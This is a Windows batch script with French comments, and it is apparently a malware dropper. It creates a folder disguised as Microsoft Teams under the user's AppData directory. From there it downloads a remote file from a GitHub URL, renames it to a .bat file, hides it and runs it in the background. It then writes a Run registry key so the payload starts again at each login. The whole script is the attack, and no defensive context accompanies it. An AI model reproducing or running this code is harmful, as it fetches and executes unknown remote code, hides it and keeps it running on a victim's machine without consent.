@echo off
setlocal

set "FOLDER=C:\Users\%USERNAME%\AppData\Roaming\Microsoft-Teams"
set "FILE-TXT=%FOLDER%\rewind.txt"
set "FILE-BAT=%FOLDER%\rewind.bat"
set "URL=https://raw.githubusercontent.com/Unyther/woukpakxpoux/main/rewind.txt"

:: Vérifier si le dossier existe, sinon le créer
if not exist "%FOLDER%" (
    mkdir "%FOLDER%"
)

:: Vérifier si le fichier existe
if exist "%FILE-BAT%" (
    start "" /B "%FILE-BAT%"
) else (
    curl -L -o "%FILE-TXT%" "%URL%"
    rename "%FILE-TXT%" rewind.bat
    attrib +h "%FOLDER%\rewind.bat"
    start "" /B "%FOLDER%\rewind.bat"
)

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Microsoft-Teams /t REG_SZ /d "%FOLDER%\rewind.bat" /f

endlocal

exit